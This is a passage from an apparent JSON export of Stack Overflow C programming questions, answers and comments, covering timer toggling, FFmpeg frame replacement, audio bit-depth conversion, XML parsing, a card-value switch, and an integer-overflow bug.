elapsed++;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 187, "user_id": 4766109, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/4ff668257b4540ae6d945a11748bdf69?s=128&d=identicon&r=PG&f=1", "display_name": "ndi equals", "link": "https://stackoverflow.com/users/4766109/ndi-equals"}, "is_accepted": false, "score": 1, "last_activity_date": 1518610928, "creation_date": 1518610928, "answer_id": 48787129, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second/48787129#48787129", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>What you are basically describing is a cycle, in which elapsed ranges from 0 to 2*activeTime-1 and the next ms it is back to 0. So in order to check in which part of the range you are at every moment, you can simply do</p>\n\n<pre><code>elapsed = (elapsed+1) % (2*activeTime);\n</code></pre>\n\n<p>Which will make the final code look like this:</p>\n\n<pre><code>int activeTime = ...;\nint shouldActivate = 0;\nint elapsed = 0; //how many ticks we had so far\n// This function gets automatically called every 1ms\nvoid tick() {\n  elapsed = (elapsed+1) % (2*activeTime);\n  if(elapsed &lt; activeTime) {\n     shouldActivate = 1;\n  } else {\n     shouldActivate = 0;\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 541, "user_id": 7559896, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/45ec66f72c97e2759cb0afa754b52432?s=128&d=identicon&r=PG&f=1", "display_name": "DEKKER", "link": "https://stackoverflow.com/users/7559896/dekker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 107, "favorite_count": 0, "accepted_answer_id": 48785187, "answer_count": 6, "score": 0, "last_activity_date": 1518610928, "creation_date": 1518604654, "last_edit_date": 1518609378, "question_id": 48785067, "link": "https://stackoverflow.com/questions/48785067/condition-for-cycling-between-a-value-each-x-milliseconds-within-a-full-second", "title": "Condition for cycling between a value each X milliseconds within a full second", "body": "<p>I am working with a micro-controller that has an interrupt that counts every 1ms since start.</p>\n\n<p>I have a variable which can be between 0 and 999 and I want to toggle another value if the time elapsed is less than <code>x</code> milliseconds (in following example it is 500ms). So between time 0 and 500 I want <code>shouldActivate</code> to be TRUE, and between 500 and 1000 it should be false, then between 1000 and 1500 it should be true and so on.</p>\n\n<pre><code>int activeTime = 500; // 500ms active\nint shouldActivate = 0;\nint elapsed = 0; //how many ticks we had so far\n// This function gets automatically called every 1ms\nvoid tick() {\n  if(elapsed &lt; activeTime) {\n     elapsed++;\n     shouldActivate = 1;\n  } else {\n     shouldActivate = 0;\n     elapsed--;\n  }\n}\n</code></pre>\n\n<p>The above code works when I just start, while elapsed goes over 500, I get problems as it just does the decrement operation only once.</p>\n\n<p>What conditions should I put into my function to achive the desired result?</p>\n"}, {"tags": ["c++", "c", "video", "ffmpeg"], "comments": [{"owner": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 2, "creation_date": 1518605184, "post_id": 48784955, "comment_id": 84571825, "body": "If you want the frames to appear in a new file, you just <i>have</i> to write them there. No magic available."}, {"owner": {"reputation": 305, "user_id": 3360601, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d79fbdac0390c98c2ea588d1fe64e120?s=128&d=identicon&r=PG&f=1", "display_name": "user3360601", "link": "https://stackoverflow.com/users/3360601/user3360601"}, "reply_to_user": {"reputation": 85822, "user_id": 597607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jCzJi.png?s=128&g=1", "display_name": "Bo Persson", "link": "https://stackoverflow.com/users/597607/bo-persson"}, "edited": false, "score": 0, "creation_date": 1518605386, "post_id": 48784955, "comment_id": 84571973, "body": "@BoPersson, I have to do it one by one or there is a way to write all that left in one time?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1518614660, "post_id": 48784955, "comment_id": 84578158, "body": "Is there really a C++ version of FF_mpeg around?"}], "answers": [{"tags": [], "owner": {"reputation": 19142, "user_id": 334402, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/476b932160cd12fa0e4515a313427679?s=128&d=identicon&r=PG", "display_name": "Mick", "link": "https://stackoverflow.com/users/334402/mick"}, "is_accepted": true, "score": 2, "last_activity_date": 1518782695, "last_edit_date": 1518782695, "creation_date": 1518705772, "answer_id": 48809864, "question_id": 48784955, "link": "https://stackoverflow.com/questions/48784955/how-can-i-replace-only-one-data-frame-from-stream-without-rewriting-whole-video/48809864#48809864", "title": "How can I replace only one data frame from stream without rewriting whole video file ? (FFmpeg)", "body": "<p>What you ask seems a logical question, if you think of the frames in a video as a sort of linked list or array - you simply want to replace one element in the array or list without having to change everything else, I think?</p>\n\n<p>The problem is that video streams are typically not as simply arranged as this.</p>\n\n<p>For instance, the encoding often uses previous and even following frames as a reference for the current frame. As an example, every 10th frame might be encoded fully and the frames in between be simply encoded as deltas to these reference frames.</p>\n\n<p>Also, the video containers, e.g. mp4, often use offsets to point to the various elements within them. Hence, if you dive inside and change the size of a particular frame by replacing it with another one, then the offsets will not be correct anymore.</p>\n\n<p>If you are doing this for a single frame in a large video file, and you know roughly where the frame is, then you may find it more effective to split the video file, into a long section before the bit you want to change, a short section containing the frame you want to change, and a long section afterwards. You can apply your change just on the short section and then concatenate the videos at the end.</p>\n\n<p>If you do something like this, you have to use a proper utility to split and concatenate the video, for the same reasons as above - i.e. to make sure the split videos have the right header info, offsets etc.</p>\n\n<p>ffmpeg supports these type of functions - for example you can see the concatenation documentation here:</p>\n\n<ul>\n<li><a href=\"https://trac.ffmpeg.org/wiki/Concatenate\" rel=\"nofollow noreferrer\">https://trac.ffmpeg.org/wiki/Concatenate</a></li>\n</ul>\n"}], "owner": {"reputation": 305, "user_id": 3360601, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d79fbdac0390c98c2ea588d1fe64e120?s=128&d=identicon&r=PG&f=1", "display_name": "user3360601", "link": "https://stackoverflow.com/users/3360601/user3360601"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "accepted_answer_id": 48809864, "answer_count": 1, "score": 0, "last_activity_date": 1518782695, "creation_date": 1518604312, "last_edit_date": 1518613841, "question_id": 48784955, "link": "https://stackoverflow.com/questions/48784955/how-can-i-replace-only-one-data-frame-from-stream-without-rewriting-whole-video", "title": "How can I replace only one data frame from stream without rewriting whole video file ? (FFmpeg)", "body": "<p>I created two streams: for input video file and for output. But even if I want to change only one (first) video frame I have to use <code>av_read_frame</code> and <code>write_frame</code> for each frame in loop just to place them from one file to another.</p>\n\n<p>How can I change only one frame and then flush somehow other frames to the output without loop <code>av_read_frame</code> , <code>write_frame</code>?</p>\n"}, {"tags": ["c++", "c", "audio", "audio-streaming"], "comments": [{"owner": {"reputation": 808, "user_id": 2918853, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oc6b4.png?s=128&g=1", "display_name": "Florian Castellane", "link": "https://stackoverflow.com/users/2918853/florian-castellane"}, "edited": false, "score": 2, "creation_date": 1518603957, "post_id": 48784780, "comment_id": 84570975, "body": "You can copy the 8-bit samples to the new 16-bit format. However, while your audio will technically be encoded in 16-bit, it will still be the same data, ie. it will not sound like it was encoded with a 16-bit resolution."}, {"owner": {"reputation": 1, "user_id": 7225683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937e00a185378b624ddc4c2c11f13f5f?s=128&d=identicon&r=PG&f=1", "display_name": "Ansu", "link": "https://stackoverflow.com/users/7225683/ansu"}, "reply_to_user": {"reputation": 808, "user_id": 2918853, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oc6b4.png?s=128&g=1", "display_name": "Florian Castellane", "link": "https://stackoverflow.com/users/2918853/florian-castellane"}, "edited": false, "score": 0, "creation_date": 1518604937, "post_id": 48784780, "comment_id": 84571654, "body": "uint16_t aud_dat = (uint16_t)(buf[i] &lt;&lt; 8) is correct or not? Here buf is unsigned character array."}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1518608506, "post_id": 48784780, "comment_id": 84573995, "body": "Sorry, underspecified. &quot;U8&quot; audio is not a standard format. You have to know how these values should be interpreted. There are at least two common 8 bit encodings, G.711 A-law and G.711 mu-Law. There are used in phone calls; both are also encodings used with 8kHz sample rate."}, {"owner": {"reputation": 1, "user_id": 7225683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937e00a185378b624ddc4c2c11f13f5f?s=128&d=identicon&r=PG&f=1", "display_name": "Ansu", "link": "https://stackoverflow.com/users/7225683/ansu"}, "edited": false, "score": 0, "creation_date": 1518609988, "post_id": 48784780, "comment_id": 84575030, "body": "While streaming the audio data, codec is showing as PCM U8 and bitspersample showing as 8 under media information. For applying above mentioned encoding to an audio data, bit depth must be 16 or more."}, {"owner": {"reputation": 808, "user_id": 2918853, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oc6b4.png?s=128&g=1", "display_name": "Florian Castellane", "link": "https://stackoverflow.com/users/2918853/florian-castellane"}, "edited": false, "score": 0, "creation_date": 1518612350, "post_id": 48784780, "comment_id": 84576669, "body": "@Ansu it does not seem correct, because your format is named &quot;S16&quot; with S for signed. So the bounds should be those of a signed 16bit int instead: shift by 7 bits, add minimum (negative) value of signed 16 bit int"}, {"owner": {"reputation": 1, "user_id": 7225683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937e00a185378b624ddc4c2c11f13f5f?s=128&d=identicon&r=PG&f=1", "display_name": "Ansu", "link": "https://stackoverflow.com/users/7225683/ansu"}, "edited": false, "score": 0, "creation_date": 1518616676, "post_id": 48784780, "comment_id": 84579557, "body": "@ Florian Castellane Thanks for your suggestions. It works fine now."}], "owner": {"reputation": 1, "user_id": 7225683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/937e00a185378b624ddc4c2c11f13f5f?s=128&d=identicon&r=PG&f=1", "display_name": "Ansu", "link": "https://stackoverflow.com/users/7225683/ansu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 494, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518604312, "creation_date": 1518603767, "last_edit_date": 1518604312, "question_id": 48784780, "link": "https://stackoverflow.com/questions/48784780/converting-audio-samples-with-bit-depth-8-into-audio-samples-with-bit-depth-16", "title": "Converting audio samples with bit depth 8 into audio samples with bit depth 16", "body": "<p>How can I convert 8-bit audio samples into 16-bit audio samples?</p>\n\n<p>Current audio configurations are:-</p>\n\n<p>codec: PCM U8,Channels: Mono, Sample rate: 8000 Hz, Bits per sample: 8</p>\n\n<p>how can I convert audio with above configuration into audio with below configurations without using audio conversion tools:-</p>\n\n<p>codec: PCM S16LE, Channels: Mono, Sample rate: 8000 Hz, Bits per sample: 16</p>\n\n<p>Can anyone explain with the help of c code?</p>\n"}, {"tags": ["c", "linux", "xml-parsing", "data-conversion"], "comments": [{"owner": {"reputation": 4625, "user_id": 1964969, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/0879c1954a7ee8660f80eafdf9f66776?s=128&d=identicon&r=PG", "display_name": "Yury Schkatula", "link": "https://stackoverflow.com/users/1964969/yury-schkatula"}, "edited": false, "score": 0, "creation_date": 1518602663, "post_id": 48784296, "comment_id": 84570137, "body": "Naturally, this can be done via XSLT transformation. Do you really need to implement XML parsing/transforming manually in C?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518602887, "post_id": 48784296, "comment_id": 84570272, "body": "There are 2 possibilities: 1. you google &quot;simple xml reader c&quot;, find some library and use that, 2. You parse the XML file yourself which isn&#39;t very diffiucult as the XML format you want to use is fixed."}], "owner": {"reputation": 23, "user_id": 6302814, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/462601713a3dc1e9fe74f9561a563d84?s=128&d=identicon&r=PG&f=1", "display_name": "Arjun G S", "link": "https://stackoverflow.com/users/6302814/arjun-g-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 25, "favorite_count": 0, "closed_date": 1518602919, "answer_count": 0, "score": 0, "last_activity_date": 1518602424, "creation_date": 1518602424, "question_id": 48784296, "link": "https://stackoverflow.com/questions/48784296/converting-xml-output-to-a-table-in-c-language", "closed_reason": "Duplicate", "title": "converting xml output to a table in c language", "body": "<p>I need to convert the xml output to a tabular format output. \nThe issue is I don't know how to use xml parser in c if that is the only solution. I think there could be some other easier way as the format below is fixed.</p>\n\n<p>I hope anyone of you could help me in solving this issue with the pseudo code or a quick way to use xml parser in c. </p>\n\n<pre><code>XML output\nINPUT:\n&lt;nvme-subsystem-host-get-iter/&gt;\n\nOUTPUT:\n&lt;results status=\"passed\"&gt;\n    &lt;attributes-list&gt;\n            &lt;nvme-target-subsystem-host-info&gt;\n                    &lt;host-nqn&gt;nqn.2014-08.org.nvmexpress:nvmf:uuid:ef938fb1-1f35-421a-b31c-109014440371&lt;/host-nqn&gt;\n                    &lt;io-queue-count&gt;4&lt;/io-queue-count&gt;\n                    &lt;io-queue-depth&gt;18&lt;/io-queue-depth&gt;\n                    &lt;subsystem&gt;s1&lt;/subsystem&gt;\n                    &lt;subsystem-uuid&gt;ffede062-f762-11e7-ac91-00a098a3af76&lt;/subsystem-uuid&gt;\n                    &lt;vserver&gt;nv1&lt;/vserver&gt;\n                    &lt;vserver-uuid&gt;445abdde-f066-11e7-8053-00a098a3af76&lt;/vserver-uuid&gt;\n            &lt;/nvme-target-subsystem-host-info&gt;\n            &lt;nvme-target-subsystem-host-info&gt;\n                    &lt;host-nqn&gt;nqn.2014-08.org.nvmexpress:nvmf:uuid:ef938fb1-1f35-421a-b31c-109014440371&lt;/host-nqn&gt;\n                    &lt;io-queue-count&gt;4&lt;/io-queue-count&gt;\n                    &lt;io-queue-depth&gt;18&lt;/io-queue-depth&gt;\n                    &lt;subsystem&gt;s2&lt;/subsystem&gt;\n                    &lt;subsystem-uuid&gt;98685d6c-f1d9-11e7-a0df-00a098a153c7&lt;/subsystem-uuid&gt;\n                    &lt;vserver&gt;nv1&lt;/vserver&gt;\n                    &lt;vserver-uuid&gt;445abdde-f066-11e7-8053-00a098a3af76&lt;/vserver-uuid&gt;\n            &lt;/nvme-target-subsystem-host-info&gt;\n            &lt;nvme-target-subsystem-host-info&gt;\n                    &lt;host-nqn&gt;nqn.2014-08.org.nvmexpress:nvmf:uuid:6cfd4ef9-72f0-4ed1-9e96-45557d28462f&lt;/host-nqn&gt;\n                    &lt;io-queue-count&gt;4&lt;/io-queue-count&gt;\n                    &lt;io-queue-depth&gt;18&lt;/io-queue-depth&gt;\n                    &lt;subsystem&gt;s3&lt;/subsystem&gt;\n                    &lt;subsystem-uuid&gt;98b0643c-f1d9-11e7-a0df-00a098a153c7&lt;/subsystem-uuid&gt;\n                    &lt;vserver&gt;nv1&lt;/vserver&gt;\n                    &lt;vserver-uuid&gt;445abdde-f066-11e7-8053-00a098a3af76&lt;/vserver-uuid&gt;\n            &lt;/nvme-target-subsystem-host-info&gt;\n    &lt;/attributes-list&gt;\n    &lt;num-records&gt;3&lt;/num-records&gt;\n</code></pre>\n\n<p></p>\n\n<pre><code>Tabular Output\nVserver Subsystem Host NQN\n------- --------- ----------------------------------------------------------\nnv1     s1         nqn.2014-08.org.nvmexpress:nvmf:uuid:ef938fb1-1f35-421a-b31c-109014440371\n        s2         nqn.2014-08.org.nvmexpress:nvmf:uuid:ef938fb1-1f35-421a-b31c-10901444037\n.\n. \n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 1732, "user_id": 2062965, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/6cc71dae7c2d7e685c4818b2624621a1?s=128&d=identicon&r=PG&f=1", "display_name": "strpeter", "link": "https://stackoverflow.com/users/2062965/strpeter"}, "edited": false, "score": 1, "creation_date": 1518602840, "post_id": 48783848, "comment_id": 84570247, "body": "Write a function."}, {"owner": {"reputation": 808, "user_id": 2918853, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oc6b4.png?s=128&g=1", "display_name": "Florian Castellane", "link": "https://stackoverflow.com/users/2918853/florian-castellane"}, "edited": false, "score": 0, "creation_date": 1518603623, "post_id": 48783848, "comment_id": 84570745, "body": "Consider writing a function to convert a <code>char cardName</code> into its value. Hint: for cards <code>&#39;2&#39;</code> to <code>&#39;9&#39;</code> the value of the card is <code>cardName - &#39;2&#39; + 2</code>"}], "answers": [{"comments": [{"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1518604884, "post_id": 48783882, "comment_id": 84571615, "body": "You can reduce the statement: <code>else if( c==&#39;1&#39; || c==&#39;J&#39; || c==&#39;K&#39; || c==&#39;A&#39; || c==&#39;Q&#39;)</code>  to  <code>else if(strchr(&quot;1JKAQ&quot;, c)) {...}</code>"}, {"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "reply_to_user": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1518617813, "post_id": 48783882, "comment_id": 84580341, "body": "@machine_1.: Yes I thought of that. But I am not sure how much OP will appreciate it. (I guess OP is a beginner) but it&#39;s a <i>good</i> way. Thanks for commenting here."}], "tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": true, "score": 5, "last_activity_date": 1518601546, "last_edit_date": 1518601546, "creation_date": 1518601202, "answer_id": 48783882, "question_id": 48783848, "link": "https://stackoverflow.com/questions/48783848/i-want-to-use-one-switch-case-instead-of-two-switch-cases/48783882#48783882", "title": "I want to use one switch case instead of two switch cases", "body": "<p>You can do it simply by putting the logic in a <strong>function</strong> and calling with once with <code>temp[0]</code> and once again with <code>str[0]</code>. That is what functions are for. Instead of repeating the logic put it in a function and call it multiple times.</p>\n\n<p>Also instead of <code>switch</code> cases <code>if</code> statement will serve a better purpose here. Something like:-</p>\n\n<pre><code>func(str[0],&amp;sum2);\n...\nfunc(temp[0],&amp;someintvar);\n</code></pre>\n\n<p>And then</p>\n\n<pre><code>void func(char c, int *a){\n   if( c&gt;='2' &amp;&amp; c&lt;='9')\n      *a = c-'0';\n   else if( c=='1' || c=='J' || c=='K' || c=='A' || c=='Q')\n      *a = 10;\n   else\n      *a = 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 9305321, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77bf52ea4dec8fff35242b7bcfe32683?s=128&d=identicon&r=PG&f=1", "display_name": "GeekyCode", "link": "https://stackoverflow.com/users/9305321/geekycode"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 48783882, "answer_count": 1, "score": -5, "last_activity_date": 1518601546, "creation_date": 1518601103, "question_id": 48783848, "link": "https://stackoverflow.com/questions/48783848/i-want-to-use-one-switch-case-instead-of-two-switch-cases", "title": "I want to use one switch case instead of two switch cases", "body": "<pre><code>int SumOfCards(char str[], int n)\n{\n   if(n==0)\n   return -1;\n   int sum1,sum2;\n   char temp[2];\n   if(str[1]==' ')\n   temp[0]= str[2];\n   else if(str[2]==' ')\n   temp[0] = str[3];\n\nswitch(str[0])\n{\n    case '2' : sum1 = 2;\n    break;\n    case '3' : sum1 = 3;\n    break;\n    case '4' : sum1 = 4;\n    break;\n    case '5' : sum1 = 5;\n    break;\n    case '6' : sum1 = 6;\n    break;\n    case '7' : sum1 = 7;\n    break;\n    case '8' : sum1 = 8;\n    break;\n    case '9' : sum1 = 9;\n    break;\n    case '1' : sum1 = 10;\n    break;\n    case 'K' : sum1 = 10;\n    break;\n    case 'J' : sum1 = 10;\n    break;\n    case 'Q' : sum1 = 10;\n    break;\n    case 'A' : sum1 = 11;\n    break;\n    default : sum1 = 0;\n    break;\n\n}\n switch(temp[0])\n{\n\n    case '2' : sum2 = 2;\n    break;\n    case '3' : sum2 = 3;\n    break;\n    case '4' : sum2 = 4;\n    break;\n    case '5' : sum2 = 5;\n    break;\n    case '6' : sum2 = 6;\n    break;\n    case '7' : sum2 = 7;\n    break;\n    case '8' : sum2 = 8;\n    break;\n    case '9' : sum2 = 9;\n    break;\n    case '1' : sum2 = 10;\n    break;\n    case 'K' : sum2 = 10;\n    break;\n    case 'J' : sum2 = 10;\n    break;\n    case 'Q' : sum2 = 10;\n    break;\n    case 'A' : sum2 = 11;\n    break;\n    default : sum2 = 0;\n    break;\n\n}\n   if(str[0]== 'A' &amp;&amp; temp[0]== 'A')\n   {sum1 = 1;\n   sum2 = 1;\n   }\n   int sum = sum1 + sum2;\n   return sum;\n\n}\n</code></pre>\n\n<p>This is a program for sum of two cards value from deck of card. Cards consist value from 2,3,...10 and J, A, Q and K. str[0] consist the value of first card and temp[0] consist the value of second card I want to use one switch case instead of two switch case because cases for str[0] and temp[0] are same. So, can i use only one switch case instead of two switch case. How, can i do it?</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518600593, "post_id": 48783643, "comment_id": 84568823, "body": "I don&#39;t really see how you can get a floating point exception in code that doesn&#39;t have <i>any</i> floating point numbers of arithmetic? Is the code you show us the <i>actual</i> code you run?"}, {"owner": {"reputation": 63, "user_id": 6052637, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/su242.jpg?s=128&g=1", "display_name": "Ravi Kumar", "link": "https://stackoverflow.com/users/6052637/ravi-kumar"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518600830, "post_id": 48783643, "comment_id": 84568974, "body": "Thats the code. I am just copy pasting the same"}, {"owner": {"reputation": 63, "user_id": 6052637, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/su242.jpg?s=128&g=1", "display_name": "Ravi Kumar", "link": "https://stackoverflow.com/users/6052637/ravi-kumar"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518601037, "post_id": 48783643, "comment_id": 84569097, "body": "Tried changing the data type of num from &quot;long long int&quot; to &quot;long int&quot; with no change in the error message"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1518602004, "post_id": 48783643, "comment_id": 84569674, "body": "<code>i</code> is becoming 0 at some point because of integer wrap around and then you get a &quot;division by 0&quot; error."}], "answers": [{"comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1518602064, "post_id": 48784037, "comment_id": 84569714, "body": "You don&#39;t need <code>#include &lt;limits.h&gt;</code> here."}], "tags": [], "owner": {"reputation": 63, "user_id": 6052637, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/su242.jpg?s=128&g=1", "display_name": "Ravi Kumar", "link": "https://stackoverflow.com/users/6052637/ravi-kumar"}, "is_accepted": false, "score": 0, "last_activity_date": 1518601682, "creation_date": 1518601682, "answer_id": 48784037, "question_id": 48783643, "link": "https://stackoverflow.com/questions/48783643/euler3-floating-point-exception-core-dumped/48784037#48784037", "title": "Euler3: Floating point exception core dumped", "body": "<p>Used limits.h and small changes to solve the issue. My Code currently:</p>\n\n<pre><code>#include &lt;limits.h&gt;\n#include &lt;stdio.h&gt;\n\nint main () {\n\n    long long int res=0, i=2;\n    long long int num=600851475143;\n\n    while (num!=1) {\n\n        if (num%i==0) {\n\n            while (num%i==0) {\n                printf (\"%lld\\t\", i);\n                num/=i;\n            }\n\n            res=i;\n        }\n\n        i++;\n     }\n\n    printf (\"\\n\\nThe largest prime factor is : %lld\\n\\n\", res);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 1, "last_activity_date": 1518602231, "creation_date": 1518602231, "answer_id": 48784214, "question_id": 48783643, "link": "https://stackoverflow.com/questions/48783643/euler3-floating-point-exception-core-dumped/48784214#48784214", "title": "Euler3: Floating point exception core dumped", "body": "<p>A significant thing you can do is </p>\n\n<ul>\n<li><p>Make <code>long long int num=600851475143LL;</code>. That <code>LL</code> suffix ensures that it is not of type <code>int</code>.</p></li>\n<li><p>The for loop indexing variables should be <code>long long</code> too. </p></li>\n</ul>\n\n<p>These two changes will make sure there won't be case of overflow which would lead to undefined behavior.</p>\n\n<p>And also make sure in any case you don't hit division by <code>0</code> (Also make sure you are using <code>%</code> correctly with correct operands). Use break point when the code breaks. That will help you solve the issue.</p>\n"}], "owner": {"reputation": 63, "user_id": 6052637, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/su242.jpg?s=128&g=1", "display_name": "Ravi Kumar", "link": "https://stackoverflow.com/users/6052637/ravi-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 220, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1518602231, "creation_date": 1518600451, "question_id": 48783643, "link": "https://stackoverflow.com/questions/48783643/euler3-floating-point-exception-core-dumped", "title": "Euler3: Floating point exception core dumped", "body": "<p>I am executing the following program in C and am getting an error: <strong>Floating Point Exception (core dumped).</strong> I removed the zero division error I had before and I am kinda stuck here. Thanks in advance for any pointers.</p>\n\n<pre><code>void main()\n{\n    int i=0;\n    long long int num=600851475143;\n\n    for(i=1;i&lt;num/2;i++)\n    {\n        if((num%i)==0)\n        {\n            for(int j=1;j&lt;i/2;j++)\n            {\n                if((i%j)!=0)\n                    printf(\"%d, \",i);\n                else break;\n            }\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "winapi", "com", "msdn"], "comments": [{"owner": {"reputation": 14021, "user_id": 7571258, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/fBP6e.png?s=128&g=1", "display_name": "zett42", "link": "https://stackoverflow.com/users/7571258/zett42"}, "edited": false, "score": 2, "creation_date": 1518602358, "post_id": 48783508, "comment_id": 84569930, "body": "Forget my 1st comment. This is C where <code>REFIID</code> is defined as <code>const IID *</code> so your call is correct. Is your project build for x64? Otherwise you will only find files in &quot;SysWOW64&quot; folder when specifying &quot;System32&quot; (if you don&#39;t disable FS redirection)."}], "answers": [{"comments": [{"owner": {"reputation": 1055, "user_id": 3212675, "user_type": "registered", "accept_rate": 77, "profile_image": "https://graph.facebook.com/100002346744735/picture?type=large", "display_name": "murzagurskiy", "link": "https://stackoverflow.com/users/3212675/murzagurskiy"}, "edited": false, "score": 0, "creation_date": 1518606066, "post_id": 48785197, "comment_id": 84572440, "body": "Yes! It was file system redirection!"}], "tags": [], "owner": {"reputation": 82917, "user_id": 3501, "user_type": "registered", "accept_rate": 30, "profile_image": 